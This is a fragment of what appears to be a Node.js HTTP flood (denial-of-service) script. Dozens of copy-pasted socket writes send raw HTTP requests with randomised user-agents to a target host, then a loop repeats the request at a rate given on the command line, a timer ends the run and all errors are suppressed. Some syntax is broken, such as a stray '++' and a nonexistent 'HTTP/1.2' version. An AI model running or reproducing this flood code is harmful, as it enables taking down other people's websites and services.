s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(kontol + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }

    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })

    //http-socket
    var pakete = kontol + parsedTarget.host + '/ HTTP/1.2\r\nHost: ' + parsedTarget.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + uap1 + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
client.connect(80,parsedTarget.host)
client.setTimeout(10000);
let ratelimit;
if (randrate !== undefined) {
    ratelimit = randomIntn(1, 90);
} else {
    ratelimit = parseInt(process.argv[4]);
}          

for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
client.write(pakete)
}


const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);++

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});